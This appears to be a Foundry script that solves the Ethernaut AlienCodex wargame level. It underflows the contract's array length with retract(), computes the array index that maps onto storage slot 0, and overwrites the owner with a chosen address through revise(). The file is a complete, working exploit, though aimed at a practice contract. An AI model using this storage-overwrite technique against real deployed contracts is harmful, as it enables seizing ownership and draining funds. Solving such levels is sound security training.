// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract AlienCodexScript is Script {
    address public alien = 0x17D77997bb8a07C68574a158922918CC8FC00171;

    function getSlotForArrayElement(uint256 _elementIndex, uint256 _arraySlot) public pure returns (uint256) {
        bytes32 startingSlotForArrayElements = keccak256(abi.encode(_arraySlot));
        return uint256(startingSlotForArrayElements) + _elementIndex;
    }

    function run() public {
        vm.startBroadcast();

        alien.call(abi.encodeWithSignature("makeContact()"));
        alien.call(abi.encodeWithSignature("retract()"));

        uint256 slot0Index = type(uint256).max - getSlotForArrayElement(0, 1) + 1;
        bytes32 content = bytes32(uint256(0x0000000000000000000000010aCab087f7f0977c31d68E8BAe117069a90Dc6574));
        alien.call(abi.encodeWithSignature("revise(uint256,bytes32)", slot0Index, content));

        (bool result, bytes memory data) = alien.call(abi.encodeWithSignature("owner()"));
        console.log("result %d", result);
        console.logBytes(data);

        vm.stopBroadcast();
    }

    function submitLevel() public {
        vm.startBroadcast();
        address ethernaut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
        address instance = 0x17D77997bb8a07C68574a158922918CC8FC00171;
        ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", instance));
        vm.stopBroadcast();
    }
}